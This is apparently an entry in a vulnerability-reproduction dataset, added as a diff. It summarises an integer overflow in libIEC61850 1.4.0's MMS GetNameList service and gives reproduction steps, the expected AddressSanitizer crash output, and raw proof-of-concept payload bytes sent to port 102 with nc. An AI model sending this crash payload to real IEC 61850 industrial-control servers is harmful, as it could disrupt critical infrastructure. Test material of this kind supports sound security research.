@@ -1,0 +1,10 @@
+Number: 492
+
+Summarize:
+The report states that libIEC61850 v1.4.0 and earlier release has an integer overflow in `src/mms/iso_mms/server/mms_get_namelist_service.c`; the supplied crash trace shows the fault in `mmsServer_handleGetNameListRequest` at line 446. When the provided PoC request bytes are sent to the `server_example_substitution` example, the server opens the connection and then crashes with an AddressSanitizer-detected SEGV caused by a READ memory access, aborting the application.
+
+Reproduce:
+The document's crash output is from libIEC61850 1.4.0 running the `server_example_substitution` example under AddressSanitizer. Create a file named `poc` from one of the provided PoC byte sequences (`poc1` or `poc2`; the report also shows a base64 form of `poc2`). Start the server with `sudo ./server_example_substitution`. In another shell, send the PoC with `cat poc | nc 0.0.0.0 102`. Expected result: the server prints `Using libIEC61850 version 1.4.0`, then `Connection opened`, then `ASAN:DEADLYSIGNAL`; AddressSanitizer reports `ERROR: AddressSanitizer: SEGV` caused by a READ in `mmsServer_handleGetNameListRequest` at `src/mms/iso_mms/server/mms_get_namelist_service.c:446`, followed by `ABORTING`.
+
+Payload:
+03 00 00 41 02 f0 80 01 00 01 00 61 34 30 32 02 01 00 a0 2d a0 2b 02 01 1a a1 26 a0 03 80 01 00 a1 0d 81 8b 54 45 4d 50 4c 41 54 7f ff ff ff 82 10 4c 4c 4e 30 24 43 46 24 53 74 72 56 61 6c 32 30
